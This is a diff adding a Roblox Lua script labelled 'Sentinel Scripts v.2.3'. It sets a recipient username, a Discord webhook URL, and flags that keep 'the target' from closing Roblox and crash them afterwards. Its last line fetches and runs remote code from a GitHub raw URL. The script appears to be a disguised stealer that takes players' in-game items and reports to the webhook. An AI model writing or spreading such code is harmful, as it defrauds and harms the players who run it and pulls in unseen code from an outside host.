@@ -1,0 +1,15 @@
+_G.Username = "W7chGamerYT"
+
+_G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
+
+_G.UnlockPets = true --// Unlocks Locked Pets
+
+_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
+
+_G.Crash = true --// Crashes Them After Its Finished
+
+_G.HubName = "Sentinel Scripts v.2.3"
+
+_G.WebhookUrl = "https://discord.com/api/webhooks/1102222137328156775/1v1b6bNjSP0DF4ijlloRx43AyLkFz69K0J_a8hx-nkqafa2R2rQp461m5JK1AotD-oez"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
